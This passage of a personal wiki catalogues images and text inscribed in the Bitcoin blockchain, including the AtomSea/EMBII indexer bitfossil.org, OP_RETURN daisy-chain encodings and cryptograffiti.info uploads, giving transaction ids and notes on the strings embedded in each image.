- 1 byte: some random punctuation
<a id="_481"></a>
- decimal number of bytes of some payload
<a id="_482"></a>
- 1 byte: some random punctuation
<a id="_483"></a>
- 64 bytes: same as the first address
<a id="_484"></a>
- CR LF
<a id="_485"></a>
- ends in NUL

<h5 id="bitfossil-org">bitfossil.org</h5>

↑ **Parent:** [AtomSea & EMBII](#atomsea-and-embii)

<a id="_486"></a>
[https://bitfossil.org/root/](https://bitfossil.org/root/) is an indexer website created by [EMBII](software.md#embii) for the [AtomSea & EMBII](#atomsea-and-embii) inscription format.

<a id="_487"></a>
There was also a semi-mirror at [https://bitfossil.org/root/](https://bitfossil.org/root/), though they were not always in perfect sync for whatever reason.

<a id="_488"></a>
The website shut down by [EMBII](software.md#embii) on January 2025 for an undisclosed reason. He mentioned however that after the shutdown he started to like the idea of keeping it down forever due the ideology of not having official centralized services linked to his protocol.[https://x.com/EMBII4U/status/1884792993921601843](https://x.com/EMBII4U/status/1884792993921601843)[https://x.com/EMBII4U/status/1888554371815821634](https://x.com/EMBII4U/status/1888554371815821634)[https://x.com/EMBII4U/status/1888692105180311565](https://x.com/EMBII4U/status/1888692105180311565)

<a id="_489"></a>
Each page has an "abuse report" button to unindex presumably.

<a id="_490"></a>
TODO website [source code](software.md#source-code)? Local indexer/extraction script?

<a id="_491"></a>
[Ciro Santilli](ciro-santilli.md)'s quick and dirty indexer and its generated index can be found at:<a id="_492"></a>

<a id="_493"></a>
- [https://github.com/cirosantilli/bitcoin-inscription-indexer#atomsea](https://github.com/cirosantilli/bitcoin-inscription-indexer#atomsea)
<a id="_494"></a>
- [https://github.com/cirosantilli/bitcoin-inscription-indexer#atomsea-index](https://github.com/cirosantilli/bitcoin-inscription-indexer#atomsea-index)

#### Raw images

↑ **Parent:** [Images](#images)

<a id="_495"></a>
In this section contains a list of images we could find that wre uploaded as raw data to the blockchain, without any special encoding, e.g. as done by the [AtomSea & EMBII](#atomsea-and-embii) system.

<a id="_496"></a>
It is possible that some/most of those were uploaded via the [cryptograffiti.info](#cryptograffiti-info) system, but since that indexer stopped working, and since the format is so non-specific, it is not possible be sure as far as we can tell.

<a id="_497"></a>
These images were indexed by looking for standard transaction output script hashes that contain [JPEG](computer.md#jpeg) or [PNG](computer.md#portable-network-graphics) images immediately on the first payload byte based on file signature bytes and indexed/easily downloaded at [https://github.com/cirosantilli/bitcoin-inscription-indexer#image-indexing-and-download](https://github.com/cirosantilli/bitcoin-inscription-indexer#image-indexing-and-download).

<a id="image-western-union-bitcoin-spoof-jpg-gz"></a>
![](https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/200f3f6f8a91ae438d1924e5cedca98cea7f0197b9eba11343948b5621ca19ed.jpg)

**[Figure 40](#image-western-union-bitcoin-spoof-jpg-gz). western-union-bitcoin-spoof.jpg.gz**. <a id="_498"></a>
[200f3f6f8a91ae438d1924e5cedca98cea7f0197b9eba11343948b5621ca19ed](https://www.blockchain.com/explorer/transactions/btc/200f3f6f8a91ae438d1924e5cedca98cea7f0197b9eba11343948b5621ca19ed) block 331804 (2014-11-27) [JPEG](computer.md#jpeg) in [Gzip](https://ourbigbook.com/go/topic/gzip) as a single [input script](cryptocurrency.md#bitcoin-input-script) constant.

<a id="_499"></a>
This ad highlights one of the claimed potential advantages of Bitcoin: cheaper/faster cross border transactions.

<a id="_500"></a>
This inscription is highlighted at [Data Insertion in Bitcoin's Blockchain by Andrew Sward, Vecna OP\_0 and Forrest Stonedahl](cryptocurrency.md#data-insertion-in-bitcoin-s-blockchain-by-andrew-sward-vecna-op-0-and-forrest-stonedahl). Finding Gzips with [binwalk](software.md#binwalk) is hard because the file signature is only 2 bytes long (1F 8B), so there are lots of false positives.

<a id="_501"></a>
Gzip binary uploaded at: [https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/200f3f6f8a91ae438d1924e5cedca98cea7f0197b9eba11343948b5621ca19ed.jpg.gz](https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/200f3f6f8a91ae438d1924e5cedca98cea7f0197b9eba11343948b5621ca19ed.jpg.gz) gunzip 1.12 complains:<a id="_502"></a>

```
western-union-bitcoin-spoof.jpg.gz: decompression OK, trailing garbage ignored
```
but we were not able to fix that: removing bytes at the end goes straight from "trailing garbage" to "incomplete file" after a certain byte.

---

<a id="image-super-mario-coin-sprite"></a>
![](https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/bf7ef3216ae09f8252c76e7d0031bc4aa131a23a6900f8371c44ffde7957c8da.png)

**[Figure 41](#image-super-mario-coin-sprite). Super Mario coin sprite**. [tx bf7ef3216ae09f8252c76e7d0031bc4aa131a23a6900f8371c44ffde7957c8da](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0345.txt#L182) ([2015-03-01](https://www.blockchain.com/explorer/transactions/btc/bf7ef3216ae09f8252c76e7d0031bc4aa131a23a6900f8371c44ffde7957c8da)). Possibly from [Super Mario World](video-game.md#super-mario-world) for the [SNES](video-game.md#super-nintendo-entertainment-system) (1990). No doubt a self-reference to [Bitcoin](cryptocurrency.md#bitcoin) itself. Encoded as a [data URL](computer.md#data-uri-scheme) for a [PNG](computer.md#portable-network-graphics) image:<a id="_503"></a>

```
<img src="data:image/png;base64,
```

Visible e.g. at [https://www.pinterest.fr/pin/137993176075040653/](https://www.pinterest.fr/pin/137993176075040653/).

---

<a id="image-jpg-thumbnail"></a>
![](https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/515a95381e511141229966d722db19db7da66a0d629b1f883d296287632e72b3.jpg)

**[Figure 42](#image-jpg-thumbnail). JPG thumbnail**. Presumably a [JPEG](computer.md#jpeg) upload test. [tx 515a95381e511141229966d722db19db7da66a0d629b1f883d296287632e72b3](https://www.blockchain.com/explorer/transactions/btc/515a95381e511141229966d722db19db7da66a0d629b1f883d296287632e72b3), [block 349362](https://www.blockchain.com/explorer/blocks/btc/349362) (2015-03-26) via [cryptograffiti.info](#cryptograffiti-info).

<a id="image-we-love-bitcoin"></a>
<img src="https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/9bdb59a0f5858af670d9b412041b8918114d7c56cc637f57f1d8469f101a5d0b.jpg" alt="" height="200">

**[Figure 43](#image-we-love-bitcoin). we love bitcoin**. <a id="_504"></a>
A heart next to a bitcoin logo and written "we love bitcoin". Reproduced at: [https://kryptomoney.com/grayscale-report-institutional-investors-retirement-funds-love-bitcoin/](https://kryptomoney.com/grayscale-report-institutional-investors-retirement-funds-love-bitcoin/)

<a id="_505"></a>
Embedded in the image itself, there's a message in the header comments:<a id="_506"></a>


> Bitcoin uses peer-to-peer technology to operate with no central authority or banks

which is the opening paragraph of: [https://bitcoin.org/en/](https://bitcoin.org/en/)

<a id="_507"></a>
[tx 9bdb59a0f5858af670d9b412041b8918114d7c56cc637f57f1d8469f101a5d0b](https://www.blockchain.com/explorer/transactions/btc/9bdb59a0f5858af670d9b412041b8918114d7c56cc637f57f1d8469f101a5d0b), [block 351375](https://www.blockchain.com/explorer/blocks/btc/351375) (2015-04-09) via [cryptograffiti.info](#cryptograffiti-info).

---

<a id="image-the-economist-logo"></a>
<img src="https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/b70bfe6a9b314611655554576feb11f15d47b9e80c5993e91829bb87895ef23c.png" alt="" height="300">

**[Figure 44](#image-the-economist-logo). The Economist logo**. <a id="_508"></a>
[tx b70bfe6a9b314611655554576feb11f15d47b9e80c5993e91829bb87895ef23c](https://www.blockchain.com/explorer/transactions/btc/b70bfe6a9b314611655554576feb11f15d47b9e80c5993e91829bb87895ef23c) block 355899 (2015-05-11). [PNG](computer.md#portable-network-graphics) inscribed as a [Daisy chain Bitcoin inscription](cryptocurrency.md#daisy-chain-bitcoin-inscription) using [OP\_RETURN](cryptocurrency.md#op-return).

<a id="_509"></a>
The daisy then follows up to the [Figure 45. "City of London School logo"](#image-city-of-london-school-logo), which therefore must be by the same uploader.

<a id="image-city-of-london-school-logo"></a>
![](https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/6ab2f3dbff0ebd856f6cf0360fc7db987f8789508dfdefdcc1f9e2aacf9ac0de.jpg)

**[Figure 45](#image-city-of-london-school-logo). City of London School logo**. <a id="_510"></a>
[tx 6ab2f3dbff0ebd856f6cf0360fc7db987f8789508dfdefdcc1f9e2aacf9ac0de](https://www.blockchain.com/explorer/transactions/btc/6ab2f3dbff0ebd856f6cf0360fc7db987f8789508dfdefdcc1f9e2aacf9ac0de) block 355901 (2015-05-11). [PNG](computer.md#portable-network-graphics) inscribed as a [Daisy chain Bitcoin inscription](cryptocurrency.md#daisy-chain-bitcoin-inscription) using [OP\_RETURN](cryptocurrency.md#op-return).

<a id="_511"></a>
This image is encoded on the very same daisy chain as [Figure 44. "The Economist logo"](#image-the-economist-logo), immediately afterwards.

<a id="_512"></a>
Furthermore, we understand that they used the following convention to "split them up":<a id="_513"></a>

<a id="_514"></a>
- paylout in vout 0: continue image
<a id="_515"></a>
- payload in vout 1: end of image

---

<a id="_516"></a>
The transactions leading up to b70bfe6a9b314611655554576feb11f15d47b9e80c5993e91829bb87895ef23c contain multiple text daisy inscriptions that show up on our text dumps at: [https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/e716e317b703e1bad63edf5064f90f5e80c5aaf5/data/out/0355.txt#L635](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/e716e317b703e1bad63edf5064f90f5e80c5aaf5/data/out/0355.txt#L635)<a id="_517"></a>

<a id="_518"></a>
- 5256d3059520c9ecda22bcf17776adcc962a5ae90333efbb00cf45818e9bf0bb:<a id="_519"></a>
  > You're poo you're papa, says WeeWaWeeWa

  then a quote from [https://bitcoin.org/en/faq](https://bitcoin.org/en/faq) ([archive](https://web.archive.org/web/20240321230812/https://bitcoin.org/en/faq)):<a id="_520"></a>
  > Bitcoin is the first implementation of a concept called "cryptocurrency", which was first described in 1998 by [Wei Dai](cryptocurrency.md#wei-dai) on the cypherpunks mailing list, suggesting the idea of a new form of money that uses cryptography to control its creation and transactions, rather than a central authority. The first Bitcoin specification and proof of concept was published in 2009 in a cryptography mailing list by [Satoshi Nakamoto](cryptocurrency.md#satoshi-nakamoto). Satoshi left the project in late 2010 without revealing much about himself. The community has since grown exponentially with many developers working on Bitcoin.

  then:<a id="_521"></a>
  > And now, via JSON-RPC!
<a id="_522"></a>
- d6b006f3cd9b545d5015263e954dae7c52c71bb5f4a0573918ff0e1ce8785de4 contains another quote from [https://bitcoin.org/en/faq](https://bitcoin.org/en/faq) ([archive](https://web.archive.org/web/20240321230812/https://bitcoin.org/en/faq)):<a id="_523"></a>
  > Much of the trust in Bitcoin comes from the fact that it requires no trust at all. Bitcoin is fully open-source and decentralized. This means that anyone has access to the entire source code at any time. Any developer in the world can therefore verify exactly how Bitcoin works. All transactions and bitcoins issued into existence can be transparently consulted in real-time by anyone. All payments can be made without reliance on a third party and the whole system is protected by heavily peer-reviewed cryptographic algorithms like those used for online banking. No organization or individual can control Bitcoin, and the network remains secure even if not all of its users can be trusted.

  followed by:<a id="_524"></a>
  > One day this will be for general storage
<a id="_525"></a>
- d9450fbd228d7a19d08f700d43200184b0d46561ffd7eb9ddbb378435ec66789 says:<a id="_526"></a>
  > Let's agree on 5MB blocks and move on?

  These inscriptions were made right in the midst of the [protests against larger block sizes](#protests-against-larger-block-sizes).
<a id="_527"></a>
- a689707f77882eb5a3b1954747f159b1c22b688a57ec17b4d636b7f94e451e3d<a id="_528"></a>
  > a single piece of data

  then the intro from [https://bitcoin.org/en/](https://bitcoin.org/en/) ([archive](https://web.archive.org/web/20240327000314/https://bitcoin.org/en/)):<a id="_529"></a>
  > Bitcoin uses peer-to-peer technology to operate with no central authority or banks; managing transactions and the issuing of bitcoins is carried out collectively by the network.

  then:<a id="_530"></a>
  > It's my cake day. I pressed the button. I have no regrets. Just stick it on the blockchain

  Parents daisy more text visible on our text dumps: [https://www.blockchain.com/explorer/transactions/btc/b70bfe6a9b314611655554576feb11f15d47b9e80c5993e91829bb87895ef23c](https://www.blockchain.com/explorer/transactions/btc/b70bfe6a9b314611655554576feb11f15d47b9e80c5993e91829bb87895ef23c)

---

<a id="image-iranian-lady-with-polar-bear-hat"></a>
![](https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/b673c7d0c62cce8315ad6cc63a2c8ca8169bf73432435760b808735e1a7fe0e2-fix.jpg)

**[Figure 46](#image-iranian-lady-with-polar-bear-hat). Iranian lady with polar bear hat.** <a id="_531"></a>
[tx b673c7d0c62cce8315ad6cc63a2c8ca8169bf73432435760b808735e1a7fe0e2](https://www.blockchain.com/explorer/transactions/btc/b673c7d0c62cce8315ad6cc63a2c8ca8169bf73432435760b808735e1a7fe0e2) block 401255 (2016-03-05). [JPEG](computer.md#jpeg) encoded with [daisy chain Bitcoin inscription](cryptocurrency.md#daisy-chain-bitcoin-inscription) using [OP\_RETURN](cryptocurrency.md#op-return).

<a id="_532"></a>
We don't know if she's actually [Iranian](continent.md#iran), it's just an uneducated guess.

<a id="_533"></a>
The image data is cut in half. This makes the image an invalid [JPEG](computer.md#jpeg), but [ImageMagick](software.md#imagemagick) is able to recover and convert to a valid image which is what we show here to make it portable to more browsers. The raw invalid image is present at: [https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/b673c7d0c62cce8315ad6cc63a2c8ca8169bf73432435760b808735e1a7fe0e2.jpg](https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/b673c7d0c62cce8315ad6cc63a2c8ca8169bf73432435760b808735e1a7fe0e2.jpg), but it can also be generally viewed by most viewers.

<a id="_534"></a>
This embedding uses a novel more specialiezd protocol on top of a raw [daisy chain Bitcoin inscription](cryptocurrency.md#daisy-chain-bitcoin-inscription).

<a id="_535"></a>
The daisy actually starts at f49e79889b34d355fa8a02f13b9db4ed69c067f975e25339737ef10e4b993d7a and data is encoded as follows:

<a id="_536"></a>
```
OP_RETURN 62 00000000 48656c6c6f20776f726c64212052657475726e20626c6f622070726f746f636f6c2076
OP_RETURN 62 00000001 313a204d41474943203d20307836322c205041434b414745203d2075696e7431362c20
OP_RETURN 62 00000002 53455155454e4345203d2075696e7431362c205041594c4f4144203d20757020746f20

OP_RETURN 62 00000000 48656c6c6f20776f726c64212052657475726e20626c6f622070726f746f636f6c2076
OP_RETURN 62 00000001 313a204d41474943203d20307836322c205041434b414745203d2075696e7431362c20
OP_RETURN 62 00000002 53455155454e4345203d2075696e7431362c205041594c4f4144203d20757020746f20

OP_RETURN 62 00000003 33352062797465732e0a

OP_RETURN 62 00010000 ffd8ffe1001845786966000049492a00080000000000000000000000ffec0011447563
OP_RETURN 62 00010001 6b79000100040000003c0000ffe1039a687474703a2f2f6e732e61646f62652e636f6d
OP_RETURN 62 00010002 2f7861702f312e302f003c3f787061636b657420626567696e3d22efbbbf222069643d
OP_RETURN 62 00010003 2257354d304d7043656869487a7265537a4e54637a6b633964223f3e203c783a786d70

...

OP_RETURN 62 00010085 51290358a41fe5408b4435254208d4810a5fe9113044c1ae3aa544656d729756395b87
OP_RETURN 62 00010086 c4e261f55c5d19e1c792c3f78adff1368db58e5a0bb85b2c6753c42de6d973edae0642
OP_RETURN 62 00010087 1b2c8370f203aaa0a6eb7ea0871d8e9ae6534b785b57347171e4df6a5463d7ce77b93b
OP_RETURN 62 00010088 9b8bf96edd1b982e2474a41ad28e3c01e74586d1d1ad7a874c5a1b7c742d2285c371f6
```

<a id="_537"></a>
The first block is:<a id="_538"></a>


> Hello world! Return blob protocol v1: MAGIC = 0x62, PACKAGE = uint16, SEQUENCE = uint16, PAYLOAD = up to

which then gets repeated, probably an error, but now with the sentence completed:<a id="_539"></a>


> Hello world! Return blob protocol v1: MAGIC = 0x62, PACKAGE = uint16, SEQUENCE = uint16, PAYLOAD = up to 35 bytes

This therefore gives us the name of the protocol as "return blob protocol". We also understand that the 0x62 was aconfiguration parameter.

<a id="_540"></a>
`ffd8ffe1` marks the start of the [JPEG](computer.md#jpeg).

<a id="_541"></a>
If the rest of the image were inscribed somewhere random in the blockchain, we'd expect to find the string `6200010089` containing the netxt data chunck on a nearby block, but [`bgrep`](systems-programming.md#bgrep) did not find it, so perhaps the data just isn't there.

<a id="_542"></a>
The last tx of the daisy is 43b182065ab2c7d1908ec3cee756d9f626c1e4bd1efa17a7c3993433b653d499 which is followed by 9e6838a3545bd59a708d0c177d6840c7d82b8ac6220138ca3d8133a1376405aa which does not contain any data.

---

<a id="image-erich-erstu"></a>
![](https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/c206e8fff656f07b27dac831ef9b956792bae4e76a2cb43f14f49f0298bf2c2f.jpg)

**[Figure 47](#image-erich-erstu). Erich Erstu**. Alias: 1Hyena. A well built man wearing a gas mask. Google image search leads to: [https://github.com/1Hyena](https://github.com/1Hyena) ([archive](https://web.archive.org/web/20201103193934/https://github.com/1Hyena)), who is the creator of [cryptograffiti.info](#cryptograffiti-info). It was around after this time that the number of raw images surged dramatically in the blockchain, so it is possible that this is when the service started operating. This further suggests that most raw image uploads we found were made with [cryptograffiti.info](#cryptograffiti-info). [tx c206e8fff656f07b27dac831ef9b956792bae4e76a2cb43f14f49f0298bf2c2f](https://www.blockchain.com/explorer/transactions/btc/c206e8fff656f07b27dac831ef9b956792bae4e76a2cb43f14f49f0298bf2c2f), [block 416527](https://www.blockchain.com/explorer/blocks/btc/416527) (2016-06-16). Embedded text:<a id="_543"></a>
> Hyena was here on the 16th of June 2016.

and:<a id="_544"></a>
> Hi mom! I love you.

---

<a id="image-water-deer"></a>
![](https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/357e8ae080e5a1b554eaec2953e3e6e2e7955f3af4559dd0f1bc6381d56aa183.jpg)

**[Figure 48](#image-water-deer). Water Deer**. [https://badtaxidermy.com](https://badtaxidermy.com) "Water Deer" image, visible at: [https://web.archive.org/web/20200527070011/http://www.badtaxidermy.com/?page=3](https://web.archive.org/web/20200527070011/http://www.badtaxidermy.com/?page=3). [tx 357e8ae080e5a1b554eaec2953e3e6e2e7955f3af4559dd0f1bc6381d56aa183](https://www.blockchain.com/explorer/transactions/btc/357e8ae080e5a1b554eaec2953e3e6e2e7955f3af4559dd0f1bc6381d56aa183), [block 416735](https://www.blockchain.com/explorer/blocks/btc/416527) (2016-06-16) via [cryptograffiti.info](#cryptograffiti-info). The file contains the strings:<a id="_545"></a>
> www.badtaxidermy.com

and:<a id="_546"></a>
> [Cryptograffiti.info](#cryptograffiti-info) now allows you to attach JPEG images to your messages.

---

<a id="image-hotmine-io"></a>
![](https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/8ec01c5e8f3b57adb13079af3b7e40e7acd3986a5ed14325388405771bd43f9b.png)

**[Figure 49](#image-hotmine-io). hotmine.io**. A mining supplier: [https://hotmine.io/en](https://hotmine.io/en). [https://twitter.com/uahotmine](https://twitter.com/uahotmine). [tx 8ec01c5e8f3b57adb13079af3b7e40e7acd3986a5ed14325388405771bd43f9b](https://www.blockchain.com/explorer/transactions/btc/8ec01c5e8f3b57adb13079af3b7e40e7acd3986a5ed14325388405771bd43f9b), [block 416835](https://www.blockchain.com/explorer/blocks/btc/416835) (2016-06-18) via [cryptograffiti.info](#cryptograffiti-info). The file contains the following string embedded into it:<a id="_547"></a>
> Smart Heating, Bitcoin Mining For You - [http://en.hotmine.io](http://en.hotmine.io)

---

<a id="image-nada-from-they-live-1988"></a>
![](https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/83df1e5ecc1c7ac455d2855e15cff8fa5771afe2ad1796c8b6b1a8e910e829c4.jpg)

**[Figure 50](#image-nada-from-they-live-1988). Nada from They Live (1988)** <a id="_548"></a>
[tx 83df1e5ecc1c7ac455d2855e15cff8fa5771afe2ad1796c8b6b1a8e910e829c4](https://www.blockchain.com/explorer/transactions/btc/83df1e5ecc1c7ac455d2855e15cff8fa5771afe2ad1796c8b6b1a8e910e829c4), [block 416896](https://www.blockchain.com/explorer/blocks/btc/416896) (2016-06-18) via [cryptograffiti.info](#cryptograffiti-info). The file has the following string embedded into it:<a id="_549"></a>


> <a id="_550"></a>
> I have come here to chew bubble gum and dance on [Ethereum](cryptocurrency.md#ethereum)'s grave.
> 
> <a id="_551"></a>
> And I'm all out of bubble gum.

which is a reference to Nada's original dialogue:<a id="_552"></a>


> I have come here to chew bubblegum and kick ass... and I'm all out of bubblegum.

<a id="video-i-m-here-to-chew-bubblegum"></a>
**[Video 5](#video-i-m-here-to-chew-bubblegum). I'm here to chew bubblegum.** [Source](https://www.youtube.com/watch?v=Wp_K8prLfso). Off-chain film scene for context.

---

<a id="image-cryptocurrency-minning-ad"></a>
![](https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/eda07af9584391bb6f5ebb07ba57a51b610751fdf06ae49d9166225c36d97d0b.jpg)

**[Figure 51](#image-cryptocurrency-minning-ad). Cryptocurrency Minning ad**. Twitter "@dobcrypto": [https://twitter.com/dobcrypto](https://twitter.com/dobcrypto) Reuploaded at: [https://imgur.com/gallery/00oOuhm](https://imgur.com/gallery/00oOuhm). [tx eda07af9584391bb6f5ebb07ba57a51b610751fdf06ae49d9166225c36d97d0b](https://www.blockchain.com/explorer/transactions/btc/eda07af9584391bb6f5ebb07ba57a51b610751fdf06ae49d9166225c36d97d0b), [block 417111](https://www.blockchain.com/explorer/blocks/btc/417111) (2016-06-20) via [cryptograffiti.info](#cryptograffiti-info). The file contains the following string:<a id="_553"></a>
> Subscribe, I will be glad to see you! [http://www.youtube.com/c/dobcryptocurrency](http://www.youtube.com/c/dobcryptocurrency)

---

<a id="image-chinese-wedding"></a>
<img src="https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/609d5e0f968c0ab7abc2be21468cfd552483d38b08e6df23d27766eb61b9be3c.jpg" alt="" height="700">

**[Figure 52](#image-chinese-wedding). Chinese wedding**. <a id="_554"></a>
[tx 609d5e0f968c0ab7abc2be21468cfd552483d38b08e6df23d27766eb61b9be3c](https://www.blockchain.com/explorer/transactions/btc/609d5e0f968c0ab7abc2be21468cfd552483d38b08e6df23d27766eb61b9be3c), [block 417131](https://www.blockchain.com/explorer/blocks/btc/417131) (2016-06-20) via [cryptograffiti.info](#cryptograffiti-info).

<a id="_555"></a>
A white man and a [Chinese](china.md) [woman](biology.md#female) wearing Chinese traditional dressess holding hands, presumably a token from their wedding. A Chinese poem is visible next to them, with four vertical setences made up of 7 characters each, to be read from right to left. This is a classic [Classical Chinese poetry form](china.md#classical-chinese-poetry-form) known as [qijue](china.md#qijue).

<a id="_556"></a>
A photo of a snowy mountain is shown in the background, fitting the theme of the poem. It looks like an European mountain, possibly Mont Blanc? TODO identify. Perhaps a reference to the nationality of the husband.

<a id="_557"></a>
TODO transcribe the [Chinese](linguistics.md#chinese-language) text, [cursive grass script](linguistics.md#cursive-script-east-asia) + traditional characters + ultra-low res put this beyond [Ciro Santilli](ciro-santilli.md)'s capabilities/patience ratio. [Ciro Santilli's wife](ciro-santilli.md#ciro-santilli-s-wife)'s transcribed gave the first column as:<a id="_558"></a>


> 丹珍默然藏山中  
> A scarlet gemstone hides quietly in the midst of the mountains.

and no [Google](google.md) hits, so maybe an original poem? What a hero. TODO transcribe the rest.

<a id="_559"></a>
The image file contains the [English](linguistics.md#english-language) transalation of the Chinese poem embeded into it:<a id="_560"></a>


> A scarlet gemstone hides quietly in the midst of the mountains.  
> Its beauty softly enters the wanderer's dreams.  
> Fame and fortune become like drifting clouds  
> But the gem endures like the constellations above.

---

<a id="image-superbuffo"></a>
![](https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/6240f61bbaeac66cd623e921a153addaf5f379a996f2de0f0c6506d628fe3812.jpg)

**[Figure 53](#image-superbuffo). Superbuffo**. [Googling](google.md) gives a Toni Caradonna: [https://twitter.com/superbuffo](https://twitter.com/superbuffo). At [https://twitter.com/Superbuffo/status/1620900765014556672](https://twitter.com/Superbuffo/status/1620900765014556672) that twitter account claimed the art or its depiction. [https://www.imdb.com/name/nm9516368/](https://www.imdb.com/name/nm9516368/) has some obscure references to him. [tx 6240f61bbaeac66cd623e921a153addaf5f379a996f2de0f0c6506d628fe3812](https://www.blockchain.com/explorer/transactions/btc/6240f61bbaeac66cd623e921a153addaf5f379a996f2de0f0c6506d628fe3812), [block 417354](https://www.blockchain.com/explorer/blocks/btc/417354) (2016-06-21) via [cryptograffiti.info](#cryptograffiti-info). The file contains the following string embedded into it, in addition to a lot of [Adobe](software.md#adobe) boilerplate:<a id="_561"></a>
> Superbuffo the first comedian on the blockchain

---

<a id="image-rene-angelil-and-celine-dion"></a>
![](https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/e2e5b9cf04d93ae5fc1b54e9208b92b668823e014b251f57510e4702661fa1a6.jpg)

**[Figure 54](#image-rene-angelil-and-celine-dion). Rene Angelil and Celine Dion**. Reproduced at: [https://web.archive.org/web/20191130174338/https://people.com/celebrity/inside-celine-dion-and-rene-angelils-21-year-marriage/](https://web.archive.org/web/20191130174338/https://people.com/celebrity/inside-celine-dion-and-rene-angelils-21-year-marriage/) but cropped to faces. [tx e2e5b9cf04d93ae5fc1b54e9208b92b668823e014b251f57510e4702661fa1a6](https://www.blockchain.com/explorer/transactions/btc/e2e5b9cf04d93ae5fc1b54e9208b92b668823e014b251f57510e4702661fa1a6), [block 417272](https://www.blockchain.com/explorer/blocks/btc/417272) (2016-06-21) via [cryptograffiti.info](#cryptograffiti-info). Embedded text:<a id="_562"></a>
> You will be here forever

---

<a id="image-new-age-dance"></a>
![](https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/0602dd1b375bc71818db0a40d7a14f438499af3eda9056125eb5a1b74bed790b.jpg)

**[Figure 55](#image-new-age-dance). New Age dance**. [Woman](biology.md#female) dancing a [New Age](religion.md#new-age)-like dance with [New Age](religion.md#new-age)-like [Indian](continent.md#india) looking clothes, holding a lamp, and with a rose on her hair. TODO identify. [tx 0602dd1b375bc71818db0a40d7a14f438499af3eda9056125eb5a1b74bed790b](https://www.blockchain.com/explorer/transactions/btc/0602dd1b375bc71818db0a40d7a14f438499af3eda9056125eb5a1b74bed790b), [block 419676](https://www.blockchain.com/explorer/blocks/btc/419676) (2016-07-07) via [cryptograffiti.info](#cryptograffiti-info). The image contains the following text embedded into it (TODO unknown mechanism, does not show up on [exifTool](computer.md#exiftool):<a id="_563"></a>
> No alcohol and smoking since 07.07.2016. Love girls!

---

<a id="image-snake-penetration-sculputure"></a>
![](https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/83f412eb7ff40fe542901186a6d37cba0eb4f8458c574bc02a6f7236c599fe07.jpg)

**[Figure 56](#image-snake-penetration-sculputure). Snake penetration sculputure**. Sculpture of what seems to be a snake penetrating a [vagina](biology.md#vagina). [tx 83f412eb7ff40fe542901186a6d37cba0eb4f8458c574bc02a6f7236c599fe07](https://www.blockchain.com/explorer/transactions/btc/83f412eb7ff40fe542901186a6d37cba0eb4f8458c574bc02a6f7236c599fe07), [block 420122](https://www.blockchain.com/explorer/blocks/btc/420122) (2016-07-10) via [cryptograffiti.info](#cryptograffiti-info).

<a id="image-wedding-invitation"></a>
![](https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/01c3af71c12d49260231dcb3cc86d6ff21b3cd90878e9556482ef3b0908abffe.jpg)

**[Figure 57](#image-wedding-invitation). Wedding invitation**. TODO: make out names, quite low res, no patience. Looks like [Cyrillic script](linguistics.md#cyrillic-script). [tx 01c3af71c12d49260231dcb3cc86d6ff21b3cd90878e9556482ef3b0908abffe](https://www.blockchain.com/explorer/transactions/btc/01c3af71c12d49260231dcb3cc86d6ff21b3cd90878e9556482ef3b0908abffe), [block 420960](https://www.blockchain.com/explorer/blocks/btc/420960) (2016-07-16) via [cryptograffiti.info](#cryptograffiti-info).

<a id="image-bitcoin-love-certificate"></a>
<img src="https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/075d1c78883ccb237b374c7ed7f9ff0f90df3308c48f9e7a29348b815326b769.jpg" alt="" height="700">

**[Figure 58](#image-bitcoin-love-certificate). Bitcoin love certificate**. Hard to make out due to ultra-low-res, and in [Cyrillic script](linguistics.md#cyrillic-script). Contains three dates: 8.02.1982, 16.07.1992 and 17.07.2016. [tx 075d1c78883ccb237b374c7ed7f9ff0f90df3308c48f9e7a29348b815326b769](https://www.blockchain.com/explorer/transactions/btc/075d1c78883ccb237b374c7ed7f9ff0f90df3308c48f9e7a29348b815326b769), [block 421151](https://www.blockchain.com/explorer/blocks/btc/421151) (2016-07-17) via [cryptograffiti.info](#cryptograffiti-info). The file contains the following text embedded into it:<a id="_564"></a>
> Wedding Wallled 15Nz214yv76BmkKLCi8kAVssa5C7nQHLjx

---

<a id="image-oles-slobodenyuk"></a>
<img src="https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/10cc5d45396ba271659a4b00d2f70c433533227e5f7ea30bb5bd3c8563d7468a.jpg" alt="" height="500">

**[Figure 59](#image-oles-slobodenyuk). Oles Slobodenyuk**. <a id="_565"></a>
